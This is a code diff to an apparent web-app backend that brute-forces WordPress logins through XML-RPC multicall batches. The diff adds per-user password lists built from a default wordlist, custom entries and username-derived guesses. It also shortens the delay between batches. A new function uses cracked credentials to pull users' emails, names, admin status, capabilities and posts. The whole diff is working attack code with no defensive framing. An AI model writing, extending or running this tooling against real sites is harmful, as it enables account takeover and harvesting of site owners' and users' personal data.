@@ -1226,15 +1226,43 @@ async def start_bruteforce(request: BruteForceRequest):
                 result["finished_at"] = datetime.now(timezone.utc)
                 return result
             
+            # Prepare password list for each username
+            password_sources = []
+            
             # Start brute force for each username
             for username in request.usernames:
                 result["progress"].append({"username": username, "status": "testing", "found": False})
                 
+                # Build password list for this user
+                user_passwords = []
+                
+                # Add default wordlist
+                if request.use_default_wordlist:
+                    user_passwords.extend(DEFAULT_PASSWORDS)
+                    if "default_wordlist" not in password_sources:
+                        password_sources.append(f"default_wordlist ({len(DEFAULT_PASSWORDS)})")
+                
+                # Add custom passwords
+                if request.passwords:
+                    user_passwords.extend(request.passwords)
+                    if "custom_passwords" not in password_sources:
+                        password_sources.append(f"custom_passwords ({len(request.passwords)})")
+                
+                # Generate username-based passwords
+                if request.generate_username_passwords:
+                    username_passwords = generate_username_based_passwords(username)
+                    user_passwords.extend(username_passwords)
+                    password_sources.append(f"username_based:{username} ({len(username_passwords)})")
+                
+                # Remove duplicates
+                user_passwords = list(dict.fromkeys(user_passwords))
+                result["passwords_count"] = max(result["passwords_count"], len(user_passwords))
+                
                 # Split passwords into batches
                 batch_size = min(request.batch_size, 500)  # Max 500 per request
                 
-                for i in range(0, len(passwords), batch_size):
-                    batch = passwords[i:i + batch_size]
+                for i in range(0, len(user_passwords), batch_size):
+                    batch = user_passwords[i:i + batch_size]
                     
                     # Build and send multicall request
                     payload = build_multicall_payload(username, batch)
@@ -1266,8 +1294,18 @@ async def start_bruteforce(request: BruteForceRequest):
                                         p["found"] = True
                                         p["password"] = f["password"]
                                 
+                                # Try to get more user info with found credentials
+                                try:
+                                    user_info = await get_user_info_disclosure(
+                                        client, base_url, username, f["password"]
+                                    )
+                                    if user_info:
+                                        result["user_info_disclosed"].append(user_info)
+                                except Exception as e:
+                                    logging.debug(f"User info disclosure failed: {e}")
+                                
                         # Small delay to avoid overwhelming server
-                        await asyncio.sleep(0.5)
+                        await asyncio.sleep(0.3)
                         
                     except Exception as e:
                         logging.error(f"Batch request error: {e}")
@@ -1278,6 +1316,7 @@ async def start_bruteforce(request: BruteForceRequest):
                     if p["username"] == username:
                         p["status"] = "completed"
             
+            result["password_sources"] = password_sources
             result["status"] = "completed"
             result["finished_at"] = datetime.now(timezone.utc)
             
@@ -1293,6 +1332,100 @@ async def start_bruteforce(request: BruteForceRequest):
     except Exception as e:
         logging.error(f"Brute force error: {e}")
         raise HTTPException(status_code=500, detail=str(e))
+
+
+async def get_user_info_disclosure(client: httpx.AsyncClient, base_url: str, username: str, password: str) -> Dict:
+    """Use valid credentials to get more user information via XMLRPC"""
+    user_info = {
+        "username": username,
+        "blogs": [],
+        "user_details": {},
+        "posts": [],
+        "capabilities": []
+    }
+    
+    try:
+        # Get user's blogs with wp.getUsersBlogs
+        payload = f'''<?xml version="1.0"?>
+        <methodCall>
+            <methodName>wp.getUsersBlogs</methodName>
+            <params>
+                <param><value><string>{username}</string></value></param>
+                <param><value><string>{password}</string></value></param>
+            </params>
+        </methodCall>'''
+        
+        resp = await client.post(f"{base_url}/xmlrpc.php", content=payload, timeout=10)
+        if resp.status_code == 200 and 'faultcode' not in resp.text.lower():
+            # Parse blog info
+            blogs = re.findall(r'<name>blogName</name>\s*<value><string>([^<]+)</string></value>', resp.text)
+            blog_ids = re.findall(r'<name>blogid</name>\s*<value><string>([^<]+)</string></value>', resp.text)
+            urls = re.findall(r'<name>url</name>\s*<value><string>([^<]+)</string></value>', resp.text)
+            is_admin = re.findall(r'<name>isAdmin</name>\s*<value><boolean>([^<]+)</boolean></value>', resp.text)
+            
+            for i, blog in enumerate(blogs):
+                user_info["blogs"].append({
+                    "name": blog,
+                    "id": blog_ids[i] if i < len(blog_ids) else None,
+                    "url": urls[i] if i < len(urls) else None,
+                    "is_admin": is_admin[i] == "1" if i < len(is_admin) else False
+                })
+        
+        # Try to get profile info with wp.getProfile
+        payload = f'''<?xml version="1.0"?>
+        <methodCall>
+            <methodName>wp.getProfile</methodName>
+            <params>
+                <param><value><int>1</int></value></param>
+                <param><value><string>{username}</string></value></param>
+                <param><value><string>{password}</string></value></param>
+            </params>
+        </methodCall>'''
+        
+        resp = await client.post(f"{base_url}/xmlrpc.php", content=payload, timeout=10)
+        if resp.status_code == 200 and 'faultcode' not in resp.text.lower():
+            # Parse profile info
+            fields = ['user_id', 'username', 'first_name', 'last_name', 'email', 'nickname', 'display_name', 'bio']
+            for field in fields:
+                match = re.search(rf'<name>{field}</name>\s*<value>(?:<string>)?([^<]*)(?:</string>)?</value>', resp.text)
+                if match and match.group(1):
+                    user_info["user_details"][field] = match.group(1)
+            
+            # Parse roles/capabilities
+            caps = re.findall(r'<name>([^<]+)</name>\s*<value><boolean>1</boolean></value>', resp.text)
+            user_info["capabilities"] = caps[:10]  # Limit to 10
+        
+        # Try to get recent posts
+        payload = f'''<?xml version="1.0"?>
+        <methodCall>
+            <methodName>wp.getPosts</methodName>
+            <params>
+                <param><value><int>1</int></value></param>
+                <param><value><string>{username}</string></value></param>
+                <param><value><string>{password}</string></value></param>
+                <param><value><struct>
+                    <member><name>number</name><value><int>5</int></value></member>
+                </struct></value></param>
+            </params>
+        </methodCall>'''
+        
+        resp = await client.post(f"{base_url}/xmlrpc.php", content=payload, timeout=10)
+        if resp.status_code == 200 and 'faultcode' not in resp.text.lower():
+            titles = re.findall(r'<name>post_title</name>\s*<value><string>([^<]+)</string></value>', resp.text)
+            post_ids = re.findall(r'<name>post_id</name>\s*<value><string>([^<]+)</string></value>', resp.text)
+            statuses = re.findall(r'<name>post_status</name>\s*<value><string>([^<]+)</string></value>', resp.text)
+            
+            for i, title in enumerate(titles[:5]):
+                user_info["posts"].append({
+                    "title": title,
+                    "id": post_ids[i] if i < len(post_ids) else None,
+                    "status": statuses[i] if i < len(statuses) else None
+                })
+                
+    except Exception as e:
+        logging.error(f"User info disclosure error: {e}")
+    
+    return user_info if user_info["blogs"] or user_info["user_details"] else None
 
 
 @api_router.get("/bruteforce/history")
